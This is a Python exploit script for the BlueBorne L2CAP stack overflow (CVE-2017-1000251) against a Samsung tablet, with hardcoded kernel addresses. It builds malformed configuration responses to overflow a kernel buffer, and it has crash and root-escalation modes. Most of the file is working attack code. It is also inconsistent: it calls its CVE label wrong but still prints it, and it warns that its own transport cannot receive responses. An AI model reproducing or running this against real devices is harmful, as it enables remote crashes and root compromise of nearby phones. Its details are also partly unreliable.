#!/usr/bin/env python3
"""
bluborne_efs_overflow.py — CVE-2017-1000251 L2CAP Stack Overflow via EFS Amplification
Target: Samsung SM-T377A (ARM32, kernel 3.10.9, NO KASLR/PXN/canaries)
NOTE: Was incorrectly labeled CVE-2017-0782 (that's the BNEP integer underflow).
      CVE-2017-1000251 is the correct CVE for the L2CAP l2cap_parse_conf_rsp overflow.
WARNING: Transport layer uses raw BTPROTO_HCI which CANNOT see ACL responses.
         Use bluborne_v4.py (PyBluez _bluetooth.hci_open_dev) for working transport.

CORRECTED exploit implementing EFS output amplification technique discovered
during protocol reverse engineering (see findings/bluborne-l2cap-protocol-re.md).

Key insight: l2cap_parse_conf_rsp() writes EFS options as 18 bytes output
regardless of input olen. With olen=1, input is 3 bytes but output is 18 bytes.
This gives 6x amplification, overflowing buf[64] from within the 60-byte
UNACCEPT input limit.

Two attack modes:
  A) UNACCEPT + EFS amplification (works without prerequisites)
  B) PENDING (no length check, but needs CONF_LOC_CONF_PEND flag)

Run on Kali Linux:
  sudo systemctl stop bluetooth
  sudo hciconfig hci0 up
  sudo python3 bluborne_efs_overflow.py 02:00:00:00:00:21 [crash|spray|info]

Requires: Python 3.6+, root/CAP_NET_RAW, BlueZ (hcitool, btmon)
"""

import socket
import struct
import subprocess
import sys
import time
import os

# ============================================================
# Target constants (NO KASLR — all addresses are static)
# ============================================================
TARGET_DEFAULT = '02:00:00:00:00:21'

COMMIT_CREDS        = 0xC0054328
PREPARE_KERNEL_CRED = 0xC00548E0
SELINUX_ENFORCING   = 0xC0B7AD18

# ============================================================
# HCI constants
# ============================================================
HCI_COMMAND_PKT  = 0x01
HCI_ACLDATA_PKT  = 0x02
HCI_EVENT_PKT    = 0x04

OGF_LINK_CTL     = 0x01
OCF_CREATE_CONN  = 0x0005
OCF_DISCONNECT   = 0x0006

EVT_CONN_COMPLETE    = 0x03
EVT_DISCONN_COMPLETE = 0x05
EVT_CMD_STATUS       = 0x0F
EVT_NUM_COMP_PKTS    = 0x13

# L2CAP
L2CAP_CID_SIG       = 0x0001
L2CAP_CONN_REQ      = 0x02
L2CAP_CONN_RSP      = 0x03
L2CAP_CONF_REQ      = 0x04
L2CAP_CONF_RSP      = 0x05
L2CAP_INFO_REQ      = 0x0A
L2CAP_INFO_RSP      = 0x0B
L2CAP_ECHO_REQ      = 0x08
L2CAP_ECHO_RSP      = 0x09

L2CAP_CONF_SUCCESS   = 0x0000
L2CAP_CONF_UNACCEPT  = 0x0001
L2CAP_CONF_PENDING   = 0x0004

L2CAP_CONF_MTU  = 0x01
L2CAP_CONF_RFC  = 0x04
L2CAP_CONF_EFS  = 0x06

PSM_SDP = 0x0001
OUR_SCID = 0x0040

# ============================================================
# HCI Socket wrapper
# ============================================================
class HCISocket:
    """Raw HCI socket for full control over L2CAP signaling."""

    def __init__(self, dev_id=0):
        self.dev_id = dev_id
        self.handle = None
        self.sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW,
                                  socket.BTPROTO_HCI)
        self.sock.bind((dev_id,))
        # Accept all HCI packet types
        try:
            filt = struct.pack('<IIIh', 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0)
            self.sock.setsockopt(0, 2, filt)
        except OSError:
            try:
                self.sock.setsockopt(0, 2, b'\xff' * 14)
            except OSError:
                pass
        self.sock.settimeout(10)

    def send_cmd(self, ogf, ocf, params=b''):
        opcode = (ogf << 10) | ocf
        pkt = struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(params)) + params
        self.sock.send(pkt)

    def send_acl(self, cid, payload):
        """Send L2CAP data on the ACL connection."""
        if not self.handle:
            raise RuntimeError('No ACL connection')
        l2cap = struct.pack('<HH', len(payload), cid) + payload
        flags = 0x2  # PB=first auto-flush
        acl_hdr = (self.handle & 0x0FFF) | (flags << 12)
        acl = struct.pack('<HH', acl_hdr, len(l2cap)) + l2cap
        pkt = bytes([HCI_ACLDATA_PKT]) + acl
        self.sock.send(pkt)

    def recv_pkt(self, timeout=5):
        self.sock.settimeout(timeout)
        try:
            raw = self.sock.recv(1024)
        except socket.timeout:
            return None
        if not raw or len(raw) < 1:
            return None

        pkt_type = raw[0]
        if pkt_type == HCI_EVENT_PKT and len(raw) >= 3:
            return ('event', raw[1], raw[3:3+raw[2]])
        elif pkt_type == HCI_ACLDATA_PKT and len(raw) >= 9:
            handle = struct.unpack('<H', raw[1:3])[0] & 0x0FFF
            acl_len = struct.unpack('<H', raw[3:5])[0]
            l2cap_len, l2cap_cid = struct.unpack('<HH', raw[5:9])
            l2cap_data = raw[9:9+l2cap_len]
            return ('acl', handle, l2cap_cid, l2cap_data)
        return ('unknown', raw)

    def create_connection(self, bdaddr):
        """Establish ACL connection using hcitool (most reliable)."""
        print(f'[*] Creating ACL connection to {bdaddr}...')
        try:
            r = subprocess.run(['hcitool', 'cc', bdaddr],
                             capture_output=True, text=True, timeout=15)
            if r.returncode != 0:
                print(f'[-] hcitool cc failed: {r.stderr.strip()}')
                return False
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            print(f'[-] hcitool error: {e}')
            return False

        time.sleep(0.5)

        # Get handle
        try:
            r = subprocess.run(['hcitool', 'con'],
                             capture_output=True, text=True, timeout=5)
            for line in r.stdout.split('\n'):
                if bdaddr.upper() in line.upper():
                    parts = line.split()
                    for i, p in enumerate(parts):
                        if p == 'handle' and i + 1 < len(parts):
                            self.handle = int(parts[i + 1])
                            print(f'[+] ACL connected! handle=0x{self.handle:04x}')
                            return True
        except Exception as e:
            print(f'[-] handle lookup failed: {e}')

        print('[-] Could not get ACL handle')
        return False

    def disconnect(self):
        if self.handle:
            self.send_cmd(OGF_LINK_CTL, OCF_DISCONNECT,
                         struct.pack('<HB', self.handle, 0x13))

# ============================================================
# L2CAP signaling packet builders
# ============================================================
def l2cap_cmd(code, ident, payload):
    """Build L2CAP signaling command: code(1) + ident(1) + length(2) + data."""
    return struct.pack('<BBH', code, ident, len(payload)) + payload

def l2cap_info_rsp(ident, info_type, result=0, data=b''):
    """Build INFO_RSP."""
    payload = struct.pack('<HH', info_type, result) + data
    return l2cap_cmd(L2CAP_INFO_RSP, ident, payload)

def l2cap_conn_req(ident, psm, scid):
    return l2cap_cmd(L2CAP_CONN_REQ, ident, struct.pack('<HH', psm, scid))

def l2cap_conf_rsp_success(ident, scid):
    """Build CONF_RSP with SUCCESS result (normal response)."""
    payload = struct.pack('<HHH', scid, 0x0000, L2CAP_CONF_SUCCESS)
    return l2cap_cmd(L2CAP_CONF_RSP, ident, payload)

def l2cap_conf_req(ident, dcid):
    """Build CONF_REQ with MTU option."""
    payload = struct.pack('<HH', dcid, 0x0000)  # dcid + flags
    payload += bytes([L2CAP_CONF_MTU, 2, 0x00, 0x02])  # MTU=512
    return l2cap_cmd(L2CAP_CONF_REQ, ident, payload)

# ============================================================
# EFS AMPLIFICATION OVERFLOW PAYLOAD
# ============================================================
def build_efs_amplification_payload(ident, target_dcid, overflow_addr):
    """Build CONF_RSP(UNACCEPT) with EFS amplification overflow.

    The UNACCEPT path in l2cap_config_rsp() limits input to 60 bytes:
        if (len > sizeof(req) - sizeof(struct l2cap_conf_req))
            disconnect;

    But l2cap_parse_conf_rsp() produces OUTPUT based on option TYPE, not input size.
    For EFS: input = type(1)+len(1)+value(olen) → output = type(1)+len(1)+efs(16) = 18 bytes
    When olen != sizeof(struct l2cap_conf_efs) = 16, the memcpy is SKIPPED but
    l2cap_add_conf_opt STILL writes the full 18-byte EFS struct.

    With olen=1: input = 3 bytes, output = 18 bytes (6x amplification!)

    Strategy:
    1. First EFS option with olen=16 (valid): 18 bytes in, 18 bytes out
       → Initializes the local efs struct with controlled values to avoid
         the stype != chan->local_stype check returning -ECONNREFUSED
    2. Fill remaining input with olen=1 EFS options: 3 bytes each
       → Each produces 18 bytes output with the previously-set efs values

    Input budget: 60 bytes
    - 1 valid EFS: 18 bytes input, 18 bytes output
    - 14 short EFS: 14 × 3 = 42 bytes input, 14 × 18 = 252 bytes output
    - Total input: 60 bytes ✓
    - Total output: 270 bytes → buf[64] starts with 4 bytes header → 266 bytes of options
    - Overflow: 266 - 60 = 206 bytes past buf[64]

    The 206 bytes of overflow contains the efs struct values repeated.
    We pack the target address at 4-byte aligned offsets in the EFS struct.
    """
    addr_le = struct.pack('<I', overflow_addr)

    # Build the valid EFS struct (16 bytes)
    # id(1) + stype(1) + msdu(2) + sdu_itime(4) + acc_lat(4) + flush_to(4)
    # Set stype = 0x01 (Best Effort) to pass the stype check
    # Pack target address at aligned offsets (4, 8, 12)
    efs_data = bytes([
        0x01,                    # id = 1
        0x01,                    # stype = L2CAP_SERV_BESTEFFORT (passes check)
    ]) + struct.pack('<H', 0x0200)  # msdu = 512 (benign)
    efs_data += addr_le          # sdu_itime = target address (offset 4-7)
    efs_data += addr_le          # acc_lat = target address (offset 8-11)
    efs_data += addr_le          # flush_to = target address (offset 12-15)
    assert len(efs_data) == 16

    options = b''

    # Option 1: Valid EFS (olen=16) to initialize the efs struct
    # This ensures the stype check passes for all subsequent amplified options
    options += bytes([L2CAP_CONF_EFS, 16]) + efs_data  # 18 bytes

    # Options 2-15: Short EFS (olen=1) for amplification
    # Each consumes 3 bytes input, produces 18 bytes output
    for _ in range(14):
        options += bytes([L2CAP_CONF_EFS, 1, 0x01])  # 3 bytes each, value=0x01

    assert len(options) == 18 + 14 * 3  # = 60 bytes

    # CONF_RSP header: scid(2) + flags(2) + result(2)
    payload = struct.pack('<HHH', target_dcid, 0x0000, L2CAP_CONF_UNACCEPT)
    payload += options

    return l2cap_cmd(L2CAP_CONF_RSP, ident, payload)


def build_pending_overflow(ident, target_dcid, overflow_addr):
    """Build CONF_RSP(PENDING) overflow — NO input length check.

    This path requires CONF_LOC_CONF_PEND to be set on the target,
    which only happens if the target sent CONF_RSP(PENDING) during
    its own config processing (EFS negotiation with ERTM mode).

    Since there's no length check, we can send unlimited options.
    """
    addr_le = struct.pack('<I', overflow_addr)

    # EFS data with target address at aligned offsets
    efs_data = bytes([0x01, 0x01]) + struct.pack('<H', 0x0200)
    efs_data += addr_le * 3  # sdu_itime, acc_lat, flush_to = target addr
    assert len(efs_data) == 16

    options = b''

    # Fill buf[4..63]: 15 MTU options = 60 bytes
    for _ in range(15):
        options += bytes([L2CAP_CONF_MTU, 2, 0x00, 0x02])

    # Overflow: 12 EFS options = 216 bytes past buffer
    for _ in range(12):
        options += bytes([L2CAP_CONF_EFS, 16]) + efs_data

    # CONF_RSP header
    payload = struct.pack('<HHH', target_dcid, 0x0000, L2CAP_CONF_PENDING)
    payload += options

    return l2cap_cmd(L2CAP_CONF_RSP, ident, payload)


# ============================================================
# Main exploit state machine
# ============================================================
def exploit(target, mode='crash'):
    if mode == 'crash':
        overflow_addr = 0xDEADBEEF
    elif mode == 'spray':
        overflow_addr = PREPARE_KERNEL_CRED
    elif mode == 'info':
        overflow_addr = None  # Info-only mode
    else:
        overflow_addr = 0xDEADBEEF

    banner = {
        'crash': 'CRASH TEST — target WILL reboot if overflow hits LR',
        'spray': 'ROOT EXPLOIT — prepare_kernel_cred spray',
        'info':  'INFO ONLY — test connectivity and signaling exchange',
    }

    print('=' * 60)
    print(f'  CVE-2017-0782 — BlueBorne EFS Amplification Overflow')
    print(f'  Mode: {banner.get(mode, mode)}')
    print(f'  Target: {target}')
    if overflow_addr:
        print(f'  Overflow addr: 0x{overflow_addr:08X}')
    print(f'  commit_creds:  0x{COMMIT_CREDS:08X}')
    print(f'  NO KASLR, NO PXN, NO stack canaries')
    print('=' * 60)
    print()

    # Step 1: ACL connection
    hci = HCISocket()
    if not hci.create_connection(target):
        print('[-] ACL connection failed')
        return False

    time.sleep(0.3)

    # Step 2: L2CAP signaling state machine
    print('[*] Starting L2CAP signaling state machine...')

    target_dcid = None     # Target's DCID for our channel
    conf_req_ident = None  # Ident of target's CONF_REQ
    state = 'WAIT_INFO'    # WAIT_INFO → CONN_REQ_SENT → CONFIGURING → EXPLOIT
    next_ident = 1
    sent_conn_req = False
    sent_exploit = False
    target_sent_pending = False

    for iteration in range(120):  # 60 seconds max
        pkt = hci.recv_pkt(timeout=0.5)

        if pkt is None:
            # If we received info responses but haven't sent CONN_REQ
            if state == 'WAIT_INFO' and iteration > 4 and not sent_conn_req:
                print('[*] No INFO_REQ from target, sending CONN_REQ proactively...')
                hci.send_acl(L2CAP_CID_SIG, l2cap_conn_req(next_ident, PSM_SDP, OUR_SCID))
                next_ident += 1
                sent_conn_req = True
                state = 'CONN_REQ_SENT'
            continue

        if pkt[0] == 'acl':
            _, rcv_handle, cid, l2data = pkt
            if cid != L2CAP_CID_SIG or len(l2data) < 4:
                continue

            sig_code = l2data[0]
            sig_ident = l2data[1]
            sig_len = struct.unpack('<H', l2data[2:4])[0]
            sig_data = l2data[4:4+sig_len]

            # --- INFO_REQ handling ---
            if sig_code == L2CAP_INFO_REQ and len(sig_data) >= 2:
                info_type = struct.unpack('<H', sig_data[:2])[0]
                print(f'  [<-] INFO_REQ type=0x{info_type:04x}')

                if info_type == 0x0002:  # Extended features
                    features = 0x000000B8  # flow control, FCS, fixed channels, EFS
                    hci.send_acl(L2CAP_CID_SIG,
                        l2cap_info_rsp(sig_ident, 0x0002, 0,
                                      struct.pack('<I', features)))
                    print(f'  [->] INFO_RSP features=0x{features:08x}')

                elif info_type == 0x0003:  # Fixed channels
                    fixed = b'\x02\x00\x00\x00\x00\x00\x00\x00'
                    hci.send_acl(L2CAP_CID_SIG,
                        l2cap_info_rsp(sig_ident, 0x0003, 0, fixed))
                    print(f'  [->] INFO_RSP fixed channels')

                else:
                    hci.send_acl(L2CAP_CID_SIG,
                        l2cap_info_rsp(sig_ident, info_type, 0x0001))
                    print(f'  [->] INFO_RSP not supported')

                # After answering info, send CONN_REQ
                if not sent_conn_req:
                    time.sleep(0.1)
                    hci.send_acl(L2CAP_CID_SIG,
                        l2cap_conn_req(next_ident, PSM_SDP, OUR_SCID))
                    next_ident += 1
                    sent_conn_req = True
                    state = 'CONN_REQ_SENT'
                    print(f'  [->] CONN_REQ PSM=SDP SCID=0x{OUR_SCID:04x}')

            # --- CONN_RSP handling ---
            elif sig_code == L2CAP_CONN_RSP and len(sig_data) >= 8:
                dcid, scid, result, status = struct.unpack('<HHHH', sig_data[:8])
                print(f'  [<-] CONN_RSP dcid=0x{dcid:04x} scid=0x{scid:04x} '
                      f'result={result} status={status}')
                if result == 0:  # SUCCESS
                    target_dcid = dcid
                    state = 'CONFIGURING'
                elif result == 1:  # PENDING
                    print('  [*] Connection pending...')

            # --- CONF_REQ handling (from target) ---
            elif sig_code == L2CAP_CONF_REQ and len(sig_data) >= 4:
                req_dcid, flags = struct.unpack('<HH', sig_data[:4])
                options = sig_data[4:]
                print(f'  [<-] CONF_REQ dcid=0x{req_dcid:04x} flags=0x{flags:04x} '
                      f'opts={options.hex()}')
                conf_req_ident = sig_ident

                # Respond with SUCCESS to complete config from our side
                hci.send_acl(L2CAP_CID_SIG,
                    l2cap_conf_rsp_success(sig_ident, req_dcid))
                print(f'  [->] CONF_RSP(SUCCESS) for target CONF_REQ')

                # Also send our CONF_REQ to target
                if target_dcid is not None:
                    hci.send_acl(L2CAP_CID_SIG,
                        l2cap_conf_req(next_ident, target_dcid))
                    next_ident += 1
                    print(f'  [->] CONF_REQ dcid=0x{target_dcid:04x}')

            # --- CONF_RSP handling (target's response to OUR CONF_REQ) ---
            elif sig_code == L2CAP_CONF_RSP and len(sig_data) >= 6:
                rsp_scid, rsp_flags, rsp_result = struct.unpack('<HHH', sig_data[:6])
                print(f'  [<-] CONF_RSP scid=0x{rsp_scid:04x} result={rsp_result}')

                if rsp_result == L2CAP_CONF_PENDING:
                    print('  [!] Target sent PENDING — CONF_LOC_CONF_PEND may be set!')
                    target_sent_pending = True

                if rsp_result in (L2CAP_CONF_SUCCESS, L2CAP_CONF_PENDING):
                    state = 'READY'

                # SEND THE EXPLOIT
                if not sent_exploit and target_dcid is not None and mode != 'info':
                    print()
                    print(f'[*] Channel ready! Sending overflow...')
                    print(f'[*] Target DCID: 0x{target_dcid:04x}')
                    print(f'[*] Using: {"PENDING" if target_sent_pending else "UNACCEPT+EFS amplification"}')
                    print(f'[!] *** SENDING IN 3 SECONDS — Ctrl+C to abort ***')

                    try:
                        for i in range(3, 0, -1):
                            print(f'[!] {i}...')
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print('\n[*] Aborted by user')
                        hci.disconnect()
                        return False

                    # Choose attack path
                    if target_sent_pending:
                        # PENDING path — no length check
                        overflow = build_pending_overflow(
                            next_ident, target_dcid, overflow_addr)
                        print(f'[+] Sending PENDING overflow ({len(overflow)} bytes)')
                    else:
                        # UNACCEPT + EFS amplification
                        overflow = build_efs_amplification_payload(
                            next_ident, target_dcid, overflow_addr)
                        print(f'[+] Sending EFS amplification overflow ({len(overflow)} bytes)')
                        print(f'    Input: 60 bytes → Output: ~270 bytes → 206 bytes past buf[64]')

                    hci.send_acl(L2CAP_CID_SIG, overflow)
                    next_ident += 1
                    sent_exploit = True
                    print('[+] OVERFLOW PAYLOAD SENT!')

                    # Wait for result
                    time.sleep(3)
                    break

            # --- Other signaling ---
            else:
                print(f'  [<-] SIG code=0x{sig_code:02x} ident={sig_ident}')

        elif pkt[0] == 'event':
            evt_code, evt_data = pkt[1], pkt[2]
            if evt_code == EVT_DISCONN_COMPLETE:
                reason = evt_data[2] if len(evt_data) > 2 else 0
                print(f'  [EVT] Disconnected (reason=0x{reason:02x})')
                break
            elif evt_code != EVT_NUM_COMP_PKTS:
                print(f'  [EVT] code=0x{evt_code:02x}')

    # Step 3: Check result
    if mode == 'info':
        print()
        if target_dcid is not None:
            print(f'[+] INFO: L2CAP channel established successfully')
            print(f'    Target DCID: 0x{target_dcid:04x}')
            print(f'    Target sent PENDING: {target_sent_pending}')
            print(f'    Best attack path: {"PENDING (unlimited)" if target_sent_pending else "UNACCEPT+EFS (amplified)"}')
        else:
            print('[-] INFO: Could not establish L2CAP channel')
        hci.disconnect()
        return True

    if sent_exploit:
        print()
        print('[*] Checking if target is alive...')
        time.sleep(2)

        # Send echo request
        hci.send_acl(L2CAP_CID_SIG, l2cap_cmd(L2CAP_ECHO_REQ, 0x42, b'PING'))
        alive = False
        for _ in range(5):
            pkt = hci.recv_pkt(timeout=2)
            if pkt and pkt[0] in ('acl', 'event'):
                if pkt[0] == 'event' and pkt[1] == EVT_DISCONN_COMPLETE:
                    break  # Disconnected = likely crashed
                alive = True
                break

        if alive:
            print('[*] Target still responding')
            print('[*] Possible issues:')
            print('    1. Channel was not in correct state for CONF_RSP processing')
            print('    2. SCID mismatch — target DCID may differ from expected')
            print('    3. For UNACCEPT: amplified EFS stype check returned -ECONNREFUSED')
            print('    4. Overflow didn\'t reach saved LR (padding larger than expected)')
        else:
            print('[!] Target NOT responding!')
            if mode == 'crash':
                print('[+] *** CRASH CONFIRMED — CVE-2017-0782 is EXPLOITABLE! ***')
                print('[+] Next: run with "spray" mode for root exploit')
            elif mode == 'spray':
                print('[+] ROP chain delivered — check if device reboots with root')
    else:
        print()
        print('[-] Exploit not sent:')
        if not sent_conn_req:
            print('    Never sent CONN_REQ (no INFO_REQ received)')
        elif target_dcid is None:
            print('    No CONN_RSP received')
        elif conf_req_ident is None:
            print('    No CONF_REQ received from target')
        else:
            print('    Unknown state issue')

    hci.disconnect()
    return sent_exploit


# ============================================================
# Entry point
# ============================================================
if __name__ == '__main__':
    if os.getuid() != 0:
        print('Need root. Run: sudo python3 bluborne_efs_overflow.py ...')
        sys.exit(1)

    target = sys.argv[1] if len(sys.argv) > 1 else TARGET_DEFAULT
    mode = sys.argv[2] if len(sys.argv) > 2 else 'crash'

    if mode not in ('crash', 'spray', 'info'):
        print(f'Unknown mode: {mode}')
        print('Modes: crash (test overflow), spray (root exploit), info (connectivity only)')
        sys.exit(1)

    exploit(target, mode)
